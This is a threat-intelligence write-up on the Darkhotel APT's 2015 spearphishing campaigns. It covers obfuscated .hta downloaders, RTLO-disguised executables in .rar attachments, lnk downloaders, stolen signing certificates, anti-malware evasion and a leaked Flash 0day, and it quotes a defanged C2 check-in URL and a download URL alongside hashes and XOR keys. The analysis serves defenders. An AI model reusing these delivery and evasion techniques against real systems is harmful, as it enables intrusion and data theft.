													<p><a href="https://securelist.com/the-darkhotel-apt/66779/" target="_blank" rel="noopener noreferrer">Darkhotel APT</a> attacks dated 2014 and earlier are characterized by the misuse of stolen certificates, the deployment of .hta files with multiple techniques, and the use of unusual methods like the infiltration of hotel Wi-Fi to place backdoors in targets&#8217; systems. In 2015, many of these techniques and activities remain in use. However, in addition to new variants of malicious .hta, we find new victims, .rar attachments with RTLO spearphishing, and the deployment of a 0day from Hacking Team.</p>
<p>The Darkhotel APT continues to spearphish targets around the world, with a wider geographic reach than its previous botnet buildout and hotel Wi-Fi attacks. Some of the targets are diplomatic or have strategic commercial interests.</p>

<h2 id="consistent-use-of-obfuscated-hta-downloaders">Consistent use of obfuscated .hta downloaders</h2>
<p>Whether the infection is achieved through spearphishing, physical access to a system or the Hacking Team Flash 0day, there frequently seems to be a common method for a newly-infected system to communicate with Darkhotel&#8217;s c2:</p>
<p>A lightly obfuscated (double escaped set of javascript variable values) script maintained within an .hta file writes an executable to disk and executes it.</p>
<p>It is interesting that this particular group has for years now deployed backdoor and downloader code in the form of .hta files. In 2010, we observed it re-purposing articles <a href="https://www.brookings.edu/opinions/obamas-new-nuclear-policies-a-step-in-the-right-direction/" target="_blank" rel="noopener noreferrer">on North Korea</a> by the US think-tank, Brookings Institute, in order to attack North Korean-related targets with <a href="http://contagiodump.blogspot.com/2010/04/apr-23-link-hta-w-trojanwin32tapaouxa.html" target="_blank" rel="noopener noreferrer">malicious code buried in .hta files</a>. It also emailed links to its <a href="http://www.nkeconwatch.com/2012/01/27/malicious-email-update/" target="_blank" rel="noopener noreferrer">malicious .hta files</a> to North Korean tourist groups, economists with an interest in North Korea, and more. It&#8217;s somewhat strange to see such heavy reliance on older Windows-specific technology like HTML applications, introduced <a href="https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/" target="_blank" rel="noopener noreferrer">by Microsoft in 1999</a>.</p>
<p>From the recent sendspace[.]servermsys[.]com/downloader.hta:</p>
<p><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/08/07204034/darkhotel_en_1.jpg" class="magnificImage"><img loading="lazy" decoding="async" id="71716" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/08/07204034/darkhotel_en_1.jpg" alt="Darkhotel&#039;s attacks in 2015" width="744" height="347" class="aligncenter size-full wp-image-71716" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/08/07204034/darkhotel_en_1.jpg 744w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/08/07204034/darkhotel_en_1-300x140.jpg 300w" sizes="auto, (max-width: 744px) 100vw, 744px" /></a></p>
<p>After execution and escaping a couple of variables, the .hta uses ancient Adodb.stream components in order to write out a string xor&#8217;d with 0x3d as an executable file and runs it.</p>
<p><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/08/07204029/darkhotel_en_2.jpg" class="magnificImage"><img loading="lazy" decoding="async" id="71717" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/08/07204029/darkhotel_en_2.jpg" alt="Darkhotel&#039;s attacks in 2015" width="535" height="325" class="aligncenter size-full wp-image-71717" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/08/07204029/darkhotel_en_2.jpg 535w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/08/07204029/darkhotel_en_2-300x182.jpg 300w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/08/07204029/darkhotel_en_2-330x200.jpg 330w" sizes="auto, (max-width: 535px) 100vw, 535px" /></a></p>
<p>This code results in the execution of &#8220;internet_explorer_Smart_recovery.exe&#8221; 054471f7e168e016c565412227acfe7f, and a hidden browser window phoning back to its c2. In this case, it seems that Darkhotel operators are checking as to whether or not the victim&#8217;s default browser is Internet Explorer, as all versions of IE return the value &#8220;0&#8221; and other browsers leave &#8220;appMinorVersion&#8221; undefined. This data collection seems somewhat odd, because .hta files are supported and run by mshta.exe on Windows systems only, still delivered with Windows 8. Perhaps it is an artefact from early development of the code. Here is a recent version:</p>
<p>&#8220;hxxp://sendspace[.]servermsys[.]com/readme.php?type=execution&amp;result=created_and_executed&amp;info=&#8221; + navigator.appMinorVersion + &#8220;</p>
<p><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/08/07204025/darkhotel_en_3.jpg" class="magnificImage"><img loading="lazy" decoding="async" id="71718" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/08/07204025/darkhotel_en_3.jpg" alt="Darkhotel&#039;s attacks in 2015" width="961" height="317" class="aligncenter size-full wp-image-71718" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/08/07204025/darkhotel_en_3.jpg 961w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/08/07204025/darkhotel_en_3-300x99.jpg 300w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/08/07204025/darkhotel_en_3-768x253.jpg 768w" sizes="auto, (max-width: 961px) 100vw, 961px" /></a></p>
<p>The &#8220;internet_explorer_Smart_recovery.exe&#8221; file is a simple obfuscated downloader. A series of xor 0x28 loops decrypt the contents of a self-deletion batch file, which is then written to disk and executed. Later in the execution, a more complex rc4 loop decrypts the download url and other strings and imports.</p>
<p><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/08/07204021/darkhotel_en_4.jpg" class="magnificImage"><img loading="lazy" decoding="async" id="71719" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/08/07204021/darkhotel_en_4.jpg" alt="Darkhotel&#039;s attacks in 2015" width="423" height="232" class="aligncenter size-full wp-image-71719" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/08/07204021/darkhotel_en_4.jpg 423w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/08/07204021/darkhotel_en_4-300x165.jpg 300w" sizes="auto, (max-width: 423px) 100vw, 423px" /></a></p>
<p>When finished, this url string decryption and connectback looks like<br />
http://sendspace[.]servermsys[.]com/wnctprx. The file is downloaded (b1f56a54309147b07dda54623fecbb89) to &#8220;.tmp&#8221; file in %temp%, executed, and the downloader exits. This larger file is a backdoor/downloader that includes ssh functionality, and drops its keys to disk for ssh interaction. We find older Darkhotel information stealers dropped and run on the system by these downloaders.</p>
<h2 id="spearphishing-and-rar-attachments-with-rtlo">Spearphishing and .rar Attachments with RTLO</h2>
<p>The Darkhotel APT will relentlessly spearphish specific targets in order to successfully compromise systems. Some targets are spearphished repeatedly with much the same social-engineering schemes. For example, the attachment &#8220;schedule(2.11~16).rar&#8221; could be sent on February 10th, with Darkhotel returning to the same targets in late May for a second attempt with attachment &#8220;schedule(6.1~6).rar&#8221;.</p>
<p><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/08/07204016/darkhotel_en_5.jpg" class="magnificImage"><img loading="lazy" decoding="async" id="71721" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/08/07204016/darkhotel_en_5.jpg" alt="Darkhotel&#039;s attacks in 2015" width="436" height="563" class="aligncenter size-full wp-image-71721" style="border:1px solid black" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/08/07204016/darkhotel_en_5.jpg 436w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/08/07204016/darkhotel_en_5-232x300.jpg 232w" sizes="auto, (max-width: 436px) 100vw, 436px" /></a></p>
<p>It consistently archives RTLO .scr executable files with in .rar archives, in order to appear to the target as innocuous .jpg files. These executable files are lite droppers, maintaining these decoy jpeg files, and code to create an lnk downloader.</p>
<p><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/08/07203811/darkhotel_en_6.jpg" class="magnificImage"><img loading="lazy" decoding="async" id="71722" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/08/07203811/darkhotel_en_6.jpg" alt="Darkhotel&#039;s attacks in 2015" width="628" height="811" class="aligncenter size-full wp-image-71722" style="border:1px solid black" /></a></p>
<p>When the target attempts to open what they think is a jpg image file, the executable code runs and drops a jpg image to disk, then opens it with mspaint.exe in the background. This &#8220;congratulations&#8221; document is in Korean, revealing a likely characteristic of the intended target.</p>
<p><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/08/07204013/darkhotel_en_7.jpg" class="magnificImage"><img loading="lazy" decoding="async" id="71723" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/08/07204013/darkhotel_en_7.jpg" alt="Darkhotel&#039;s attacks in 2015" width="459" height="653" class="aligncenter size-full wp-image-71723" style="border:1px solid black" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/08/07204013/darkhotel_en_7.jpg 459w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/08/07204013/darkhotel_en_7-211x300.jpg 211w" sizes="auto, (max-width: 459px) 100vw, 459px" /></a></p>
<p>While the image is displayed, the code drops an unusual mspaint.lnk shortcut to disk and launches it. The shortcut maintains a multiline target shell script. This technique is also used by other APTs as persistence mechanisms, as documented by our <a href="https://www.fireeye.com/blog/threat-research/2014/02/ground-windows-scripting-host-wsh.html" target="_blank" rel="noopener noreferrer">colleagues</a>. The 64kb lnk file is downloader code:</p>
<p><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/08/07204008/darkhotel_en_8.jpg" class="magnificImage"><img loading="lazy" decoding="async" id="71724" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/08/07204008/darkhotel_en_8.jpg" alt="Darkhotel&#039;s attacks in 2015" width="623" height="550" class="aligncenter size-full wp-image-71724" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/08/07204008/darkhotel_en_8.jpg 623w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/08/07204008/darkhotel_en_8-300x265.jpg 300w" sizes="auto, (max-width: 623px) 100vw, 623px" /></a></p>
<p>When this lnk file is executed, it begins an AJAX-based download process for the &#8220;unzip.js&#8221; file (a07124b65a76ee7d721d746fd8047066) on openofficev.info. This is another wscript file implementing AJAX to download and execute a relatively large compiled executable:</p>
<p><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/08/07204003/darkhotel_en_9.jpg" class="magnificImage"><img loading="lazy" decoding="async" id="71725" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/08/07204003/darkhotel_en_9.jpg" alt="Darkhotel&#039;s attacks in 2015" width="501" height="459" class="aligncenter size-full wp-image-71725" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/08/07204003/darkhotel_en_9.jpg 501w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/08/07204003/darkhotel_en_9-300x275.jpg 300w" sizes="auto, (max-width: 501px) 100vw, 501px" /></a></p>
<p>This executable code is saved to %temp%\csrtsrm.exe and executed there. It is a relatively large executable (~1.2 mb) that injects malicious code and spawns remote threads into legitimate processes.</p>
<h2 id="stolen-certificates-and-evasion">Stolen certificates and evasion</h2>
<p>The group appears to maintain a stockpile of stolen certificates and deploys their downloaders and the backdoors signed with them. Some of the more recent revoked certificates include ones that belong to Xuchang Hongguang Technology Co. Ltd.</p>
<p>Darkhotel now tends to hide its code behind layers of encryption. It is likely that it has slowly adapted to attacking better-defended environments and prefers not to burn these stolen digital certificates. In previous attacks it would simply have taken advantage of a long list of weakly implemented, broken certificates.</p>
<p>Not only are its obfuscation techniques becoming stronger, but its anti-detection technology list is growing. For example, this signed downloader (d896ebfc819741e0a97c651de1d15fec) decrypts a set of anti-malware strings in stages to identify defensive technologies on a newly-infected system, and then opens each process, looking for a matching image name:</p>

<p>Even the identifying information that the backdoor seeks from a system is not decrypted until runtime. Like the &#8220;information-stealer&#8221; component documented in our <a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08070901/darkhotelappendixindicators_kl.pdf" target="_blank" rel="noopener noreferrer">previous Darkhotel technical report</a>, this component seeks to steal a set of data with which to identify the infected system. Much of the information is collected with the same set of calls, i.e. kernel32.GetDefaultSystemLangID, kernel32.GetVersion, and kernel32.GetSystemInfo:</p>

<li>Network adapter information</li>
<li>Processor architecture</li>
<li>Hostname and IP address</li>
<li>Windows OS and Service Pack versions</li>
</ul>
<p>Essentially, much of this information-stealer code is the same as that observed in previous attacks.</p>
<h2 id="tisone360-com-visits-and-hacking-team-flash-0day">Tisone360.com, Visits, and Hacking Team Flash 0day</h2>
<p>The tisone360.com site was especially interesting to us. In April 2015, Darkhotel was email-phishing with links to earlier (cve-2014) Flash exploits, and then, at the beginning of July, it began to distribute what is reported to be a leaked Hacking Team Flash 0day.</p>
<p>It looks like the Darkhotel APT may have been using the leaked HackingTeam Flash 0day to target specific systems. We can pivot from &#8220;tisone360.com&#8221; to identify some of this activity. The site was up and active as late as 22 July, 2015. However, this looks to be a small part of its activity. In addition to the icon.swf HT 0day (214709aa7c5e4e8b60759a175737bb2b), it looks as though the &#8220;tisone360.com&#8221; site was delivering a Flash CVE-2014-0497 exploit in April. <a href="https://securelist.com/cve-2014-0497-a-0-day-vulnerability/58244/" target="_blank" rel="noopener noreferrer">We reported the related vulnerability</a> to Adobe in January 2014, when it was being used by the Darkhotel APT.</p>
<p>Recently, the Darkhotel APT has maintained multiple working directories on this site.</p>
<p><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/08/07204000/darkhotel_en_10.png" class="magnificImage"><img loading="lazy" decoding="async" id="71726" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/08/07204000/darkhotel_en_10.png" alt="Darkhotel&#039;s attacks in 2015" width="295" height="243" class="aligncenter size-full wp-image-71726" /></a></p>
<p>It is the ims2 directory that is the most active. It contains a set of backdoors and exploits. The most interesting of these is the reported Hacking Team Flash 0day, icon.swf. In the days following the public mention of this server, the crew slowly tightened down open access to /ims2/. Either way, the contents continued to be actively used.</p>
<p>icon.swf (214709aa7c5e4e8b60759a175737bb2b) -&gt; icon.jpg (42a837c4433ae6bd7490baec8aeb5091)<br />
 -&gt; %temp%\RealTemp.exe (61cc019c3141281073181c4ef1f4e524)</p>
<p>After icon.jpg is downloaded by the flash exploit, it is decoded with a multi-byte xor key 0xb369195a02. It then downloads further components.</p>
<p>It&#8217;s interesting to note that the group appears to be altering the compilation and linker timestamps of its executable code to dates in 2013. We see this across multiple samples deployed and observed for the first time in mid-2015, including the icon.jpg downloader.</p>
<p><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/08/07203955/darkhotel_en_11.jpg" class="magnificImage"><img loading="lazy" decoding="async" id="71727" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/08/07203955/darkhotel_en_11.jpg" alt="Darkhotel&#039;s attacks in 2015" width="801" height="81" class="aligncenter size-full wp-image-71727" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/08/07203955/darkhotel_en_11.jpg 801w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/08/07203955/darkhotel_en_11-300x30.jpg 300w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/08/07203955/darkhotel_en_11-768x78.jpg 768w" sizes="auto, (max-width: 801px) 100vw, 801px" /></a></p>
<p>A log of visits to the site directory records that the directory was set up on July 8th. A handful of visits to a specific url on the server from five systems based in the following locations were recorded on the 8th and 9th. Several of these are likely to be Darkhotel APT targets:</p>
<ul>
<li>Germany</li>
<li>South Korea</li>
<li>China (likely to be research)</li>
<li>US</li>
<li>Japan</li>
</ul>
<p>However, one of those systems hammered the site on the 9th, visiting almost 12,000 times in 30 minutes. This volume of traffic is likely to represent a noisy scanning research attempt and not someone DoS&#8217;ing the site:</p>

<h2 id="a-consistent-attack-flow">A consistent attack flow</h2>
<p>The Darkhotel group tends to stick with what works. For example, for years we saw repeated use of spearphishing targets directly with .hta files. Now, as with the tisone360.com site above, we have seen repeated use in 2015 of a creative chain of delivery sets.</p>
<p>downloader -&gt; hta checkin -&gt; info stealer -&gt; more compiled components.<br />
dropper -&gt; wsh script -&gt; wsh script -&gt; info stealer -&gt; more compiled components<br />
spearphish -&gt; dropper -&gt; hta checkin -&gt; downloader -&gt; info stealer</p>
<p>While a chain of delivery that includes obfuscated scripts within .hta files occurred as far back as 2011, the volume appears to have picked up in 2014 and now 2015.</p>
<p>openofficev[.]info (2015)<br />
office-revision[.]com (2014)<br />
online.newssupply[.]net (2011)</p>
